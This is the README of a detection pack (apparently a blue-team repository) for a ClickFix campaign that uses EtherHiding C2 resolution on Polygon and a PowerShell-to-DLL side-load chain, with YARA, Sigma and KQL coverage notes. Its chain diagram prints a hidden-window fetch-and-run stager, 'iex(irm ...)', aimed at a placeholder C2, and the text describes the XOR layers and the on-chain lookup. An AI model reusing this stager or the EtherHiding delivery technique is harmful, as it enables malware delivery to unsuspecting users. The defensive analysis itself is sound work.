# authorization-cdn-etherhiding-clickfix

Blog post: https://blueteam.cool/posts/authorization-cdn-etherhiding-clickfix/

## Summary

> **Numbers below are captured at 2026-07-08 21:08-21:28 UTC**, in one continuous single-session re-validation. This is an active campaign - re-running the same queries later will very likely show different (probably higher) numbers. Treat every count as a floor, not a fixed fact. See `revalidation-2026-07-08-full/00_REVALIDATION_LOG.md` for the complete, timestamped, fully-captured evidence trail behind every number in this file.

A ClickFix lure injected into compromised WordPress/CMS sites delivers a five-stage PowerShell loader chain ending in a DLL side-load. The interesting part is the C2 layer: the injected browser-side script never hardcodes a C2 domain. It reads the current one live from a Polygon smart contract (EtherHiding), then loads `<c2>/api.php?s=<site-id>` which mints a one-time, short-lived, per-victim token and renders the fake "verification" overlay with the ClickFix paste command baked in.

The victim pastes a hidden-window PowerShell one-liner that peels through seven single-byte XOR layers and a reflection trick to reach a dropper. The dropper sleeps 19 seconds, downloads a legitimate 7-Zip binary plus an 8 MB payload ZIP, and runs `cmtp_86x.exe`, which side-loads a trojanised, 27 MB `cmutil.dll` (masquerading as a real Microsoft Connection Manager component). About 26 MB of that DLL is low-entropy word-salad filler to defeat size-limited scanners; the real payload is a 738 KB, entropy-8.0 encrypted blob decrypted in memory at runtime. The decryption key was not recovered statically.

Reading the EtherHiding contract's full on-chain transaction history recovered 18 rotating C2 domains going back to 5 June 2026, all pushed by a single wallet via `updateDomain` calls. That contract turned out to be the same one behind an earlier, separately-published campaign ([puppetking-stealc](../puppetking-stealc/)) that delivered StealC v2 - the blockchain linked two incidents that looked unrelated from the malware alone. Feeding all 18 historical domains through public URL-scan data surfaced 851 candidate compromised sites (corrected from an initial 477 - see "Methodology correction" below), of which 123 were confirmed still actively injecting via a brute-force per-site-XOR-key checker (the injection is polymorphic - key, variable names, and guard-variable are all randomised per site, so a fixed-key signature misses most of it). A second, separate wallet and EtherHiding contract set - active since April 2026, using a distinct "money" themed C2 naming convention - was found running the identical kit against a mostly separate set of victims (150 candidates, 27 confirmed, 17 sites overlapping the first operator). A third wallet and contract, active only since 29 June 2026 and using a random-string C2 naming convention, was discovered by accident during re-validation (4 candidate sites found via its own domains, 3 confirmed; its full victim population has not been mapped).

### Methodology correction

The original candidate counts (477 for operator 1, 86 for operator 2) were undercounted due to a pagination bug: the urlscan Search API's `has_more` response field is unreliable on this account tier and silently returns `false` even when hundreds of additional results exist beyond the first 100-result page. The original scan trusted that field and stopped after page one on every domain. Corrected pagination - continuing to page via `search_after` as long as a full page comes back, regardless of `has_more` - found every original candidate still present (zero dropped) plus hundreds more per operator. A follow-up check found the candidate pool itself moves within hours (815 -> 847 for operator 1 in under 3 hours during this investigation), which is why the final published numbers all come from one continuous ~20-minute session rather than results stitched together from separate runs. See the blog post's "Historical domains find historical victims" section for the full reproducible methodology, including the exact query and pagination logic.

### Bytecode fingerprinting and the search for a fourth operator

A second, same-day re-validation pass went beyond re-testing the existing pipeline's output and asked whether the methodology itself had a blind spot: the original approach only finds an operator by searching for domains already known, so operator 3 was found by chance, not by design. Comparing the deployed bytecode of all known contracts found that **operator 2's five contracts and operator 3's contract are byte-for-byte identical** (full SHA-256 `473d49db1b57434ad2f08d43361f5d73b5ea864a408afb052645f5d5c63db3d3`, 4,864 bytes), while operator 1's *live* contract is a different, shorter compiled artifact (2,980 bytes) sharing only the same function-selector interface. A subsequent complete pull of operator 1's wallet history (rather than the partial pull relied on earlier) found **two more contracts**: on 13 May 2026, three weeks before its known campaign start, operator 1's wallet deployed two contracts - each touched exactly once (one creation, one `updateDomain` call with placeholder, non-URL "domain" data, then abandoned) - that are themselves byte-identical to the shared 4,864-byte template. **Eight of the nine contracts now known across all three operators are byte-identical; only operator 1's live contract differs.** This is materially stronger evidence of a shared origin than the earlier "same kit" framing based on JS/selector similarity, and stronger than the original bytecode finding (6 of 9 contracts) too.

Three systematic (non-domain-based) approaches were tried to look for a fourth operator, two of them re-confirmed a second time in the final complete re-validation pass: funding-source tracing on the deployer wallets (dead end, confirmed twice - both traceable funders are high-volume wallets, 2,229 and ~294,000 outgoing transactions, consistent with shared exchange/gas infrastructure, not a dedicated funding trail; operator 2's wallet shows zero incoming transactions via either Blockscout endpoint, checked twice, a genuine data-availability gap), a direct bytecode-similarity search across Polygon (blocked by a genuine Blockscout API limitation - no bytecode search capability), and a manual re-investigation of the same two anomalous sites that showed the injected-loader shape but never matched the known kit signature across both rounds. One correction along the way: one of those two sites was originally described as a cryptocurrency wallet-drainer based on a partial decode; a full, untruncated re-decode in the final pass showed it's actually a fake-CAPTCHA/traffic-distribution-system gate resolving its own config via a *different* Polygon contract - a separate actor also using EtherHiding, not a wallet drainer and not a fourth operator here. The other site remains an unrelated fake-analytics redirect network. No fourth operator was found among the three identified wallets; all attempts and outcomes, including the correction, are documented in full in `revalidation-2026-07-08-full/00_REVALIDATION_LOG.md`.

```
Compromised WordPress/CMS site
  |  polymorphic injected <script> (atob -> per-site XOR -> new Function)
  v
EtherHiding: eth_call to a Polygon smart contract  --------->  returns current C2 domain
  |
  v
<C2>/api.php?s=<site-id>  -- mints a one-time per-victim token, renders ClickFix overlay
  |  victim pastes into Run
  v
PowerShell  iex(irm '<C2>/<token>')  -- hidden window
  |  5 layers: XOR 44 -> XOR 52 -> XOR 114 -> reflection (XOR 85) -> Base64+XOR 69
  v
Dropper (Stage 5): Start-Sleep 19s, download 7z.exe + payload.zip, extract, run
  |
  v
cmtp_86x.exe  --side-loads-->  cmutil.dll (27 MB, ~26 MB filler + trojanised exports)
                                       |  decrypts in memory
                                       v
                            738 KB encrypted native implant (capability unresolved)
                                       |
                                       v
                        C2 beacon / task-poll  -->  /p/<64-hex>  on the same host
```

## What is included

| File | Description |
|------|--------------|
| `iocs.csv` | All indicators: domains (all three operators, full 18-domain rotation history for operator 1 plus operator 2 and 3 domains), IPs, URLs, blockchain contracts/wallets/selector, file hashes, dropped filenames, malicious DLL exports, and the campaign's XOR key set |
| `rule.yar` | Three YARA rules: the injected browser-loader shape (polymorphic-aware), the shared on-chain constants across all three operators, and the host-side PowerShell/DLL chain artefacts |
| `sigma-clickfix-ps-loader.yml` | Sigma rule for the iex+irm+UseBasicParsing / "Verification ID" PowerShell stager pattern |
| `sigma-cmutil-dll-sideload.yml` | Sigma rule for `cmutil.dll` loading from any path outside `System32` |
| `sigma-temp-7z-extraction.yml` | Sigma rule for a randomly-named 7-Zip-style extraction process run from `%TEMP%` by PowerShell |
| `kql.md` | Seven KQL queries for Defender XDR / Sentinel: PS stager, DLL side-load, TEMP extraction, operator-1 C2 beacon, Polygon RPC calls, token-mint follow-through, operator-2 DNS hunt |

## Coverage notes

### What these detections cover

- The ClickFix paste-and-run PowerShell stager pattern, including the "Verification ID" comment this kit stamps onto every command line
- The injected browser-side loader shape (`atob` + byte-XOR + `new Function(new TextDecoder(...))`), written to survive the fact that the key, variable names, and guard variable are randomised per compromised site
- The shared on-chain constants (all three EtherHiding contract addresses, all three operator wallets, the shared read selector) that persist across every C2 domain rotation
- The `cmutil.dll` side-load via image-load monitoring outside `System32`
- The `%TEMP%` 7-Zip extraction step that unpacks the payload with a legitimate, renamed binary
- Operator-1's current C2 IP and the domains recovered from the full 18-entry on-chain rotation history
- Operator-2's distinct C2 naming theme
- Operator-3's four known C2 domains (its full rotation and candidate-site history is not yet mapped - see below)

### What they do NOT cover

- **The inner 738 KB encrypted implant**: fully opaque without the runtime decryption key. Nothing here detects its behaviour once decrypted in memory - that needs EDR behavioural detection or a dynamic detonation.
- **New C2 domains after future on-chain rotations**: the IP for operator 1 has been stable across several domain changes, but is not guaranteed to remain so. Re-query the contract (`0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2`, selector `0xb68d1809`) for the live domain rather than relying solely on the static IOC list.
- **Compromised-site remediation**: these rules detect the injection and the resulting execution chain; they do not identify *how* a given WordPress/CMS site was initially compromised (plugin CVE, credential stuffing, etc. was not established for the sites in scope here).
- **The `labiennale.art.pl` lure specifically**: the injection was victim-gated and never served to the analysis host directly. The loader-shape YARA/Sigma rules are validated against the broader set of confirmed-injecting sites found during the pivot, not against that specific host.
- **Operator 3's full candidate population**: only its own four known domains were searched (finding 4 additional candidate sites, 2 confirmed live: `www.motorbeam.com`, `www.realoptionsvaluation.com`). Unlike operators 1 and 2, no full urlscan sweep or historical-victim mapping has been done for this operator - its true footprint is very likely larger than what's captured here. The operator's third confirmed site (`greencoalition.pl`) was found only by accident, sitting in the other two operators' candidate pool - not through any systematic search of operator 3's own infrastructure.
- **Operator 1's two abandoned test contracts (13 May 2026)**: found via a complete wallet-history pull; not chased further into what else that wallet may have touched around the same period beyond confirming the two contracts' own transaction history in full.

## False-positive notes

**`sigma-clickfix-ps-loader.yml`**: The `filter_legitimate` block excludes `microsoft.com` to suppress common winget/Windows Update patterns using `irm`+`iex`. Extend the filter for any internal tooling with the same shape. The "Verification ID" comment string is distinctive and should have a very low false-positive rate on its own.

**`sigma-cmutil-dll-sideload.yml`**: None known. The legitimate `cmutil.dll` only ships in `System32` on a standard Windows build; a load from anywhere else is not expected.

**`sigma-temp-7z-extraction.yml`**: Medium false-positive risk - legitimate installers and automation also stage 7-Zip-style extraction in `%TEMP%`. The rule requires a PowerShell parent to narrow this; cross-reference against `sigma-clickfix-ps-loader.yml` hits on the same host for higher confidence.

**KQL query 5 (Polygon RPC)**: Will fire on developer workstations running web3 tooling, crypto wallets, or dapp browsers. Tune by excluding known developer endpoints.

**`rule.yar` - `ClickFix_AuthCDN_PressEnter_Chain`**: The PowerShell-shape strings (`$ps_bxor`, `$ps_refl`) are generic obfuscation patterns and could theoretically match unrelated heavily-obfuscated PowerShell. The export-name and decoy-token conditions are high-confidence and campaign-specific.

## Confidence

**Delivery chain and DLL side-load: high.** All five file hashes, the PE import/export structure, and every XOR key in the PowerShell chain were reproduced byte-for-byte from live server captures and independently re-verified.

**EtherHiding mechanism and on-chain attribution: high.** The injected JavaScript loader was decoded and its blockchain-read behaviour confirmed live (repeated `eth_call` against each contract returned its current C2). The 18-domain rotation history, the 23 `updateDomain` transactions for operator 1, the operator-2 wallet's 5 contract deployments, and operator 3's full 4-transaction on-chain history were all confirmed directly against on-chain data, not inferred.

**Compromised-site counts: lower bound, not a ceiling, captured at a specific timestamp.** 123 confirmed for operator 1, 27 for operator 2, and 3 for operator 3 (153 total) are 3-pass union results from a single continuous ~20-minute live re-fetch session (2026-07-08 21:08-21:28 UTC) - all three passes back to back, not spread across days, so the whole snapshot describes one moment rather than numbers stitched together from different runs. The injection is served intermittently (gated by referrer/geo/UA/cookie on some backends), so these are floors on the number of still-live infections at that timestamp, not a ceiling, and not a claim about right now if you're reading this later. The underlying candidate pools (851 / 150 / 4, 984 combined) were themselves corrected upward from an original undercount caused by a pagination bug - see "Methodology correction" above - and confirmed to keep growing on re-test (815 -> 847 for operator 1 within 3 hours during this investigation). Full evidence: `revalidation-2026-07-08-full/`.

**Inner implant capability: unknown, not claimed.** The 738 KB inner payload is encrypted and its exact capability was not established statically. It is noted as consistent in shape and beacon behaviour with a separate case's confirmed AES-256-GCM native RAT/stealer, but that is a hypothesis, not a finding about this specific sample.

**Attribution to a specific actor, group, or individual: not claimed.** "Operator" in this pack means a wallet with a consistent, distinct on-chain pattern - not an identified person or group. Three wallets running the identical kit against separate infrastructure and mostly-separate victims is consistent with a shared or sold toolkit; who holds any of the wallets is not established.

## Related detections

- [iocs.csv](iocs.csv) - all indicators
- [rule.yar](rule.yar) - YARA rules
- [sigma-clickfix-ps-loader.yml](sigma-clickfix-ps-loader.yml) - Sigma: PowerShell ClickFix stager
- [sigma-cmutil-dll-sideload.yml](sigma-cmutil-dll-sideload.yml) - Sigma: cmutil.dll side-load
- [sigma-temp-7z-extraction.yml](sigma-temp-7z-extraction.yml) - Sigma: %TEMP% 7-Zip extraction
- [kql.md](kql.md) - KQL queries for Defender XDR / Sentinel
- [revalidation-2026-07-08-full/](revalidation-2026-07-08-full/) - **the canonical, complete, single-session evidence behind every number currently published** (851/150/4 candidates, 123/27/3 confirmed, captured 2026-07-08 21:08-21:28 UTC): every script, paired with its full untruncated output - candidate builders for all 3 operators in one run, all 3 live-verification passes with every one of 984 sites' individual result, full raw on-chain JSON for all wallets/contracts including the 2 newly-discovered operator-1 test contracts, full hex bytecode for all 9 known contracts, funding-trace and bytecode-search dead ends, a from-scratch WRAPPER_NO_MATCH re-investigation, and an independent spot-check. Start with `00_REVALIDATION_LOG.md` in that folder - every number in it cites the exact output file it came from.
- [revalidation-2026-07-08/](revalidation-2026-07-08/) - the first, partial re-validation pass (same day, earlier) that discovered the pagination bug and operator 3. Kept as historical record of how the investigation progressed; superseded by the folder above for current numbers.
- Related campaign: [puppetking-stealc](../puppetking-stealc/) - same EtherHiding contract, earlier C2 rotation, different final payload (StealC v2)
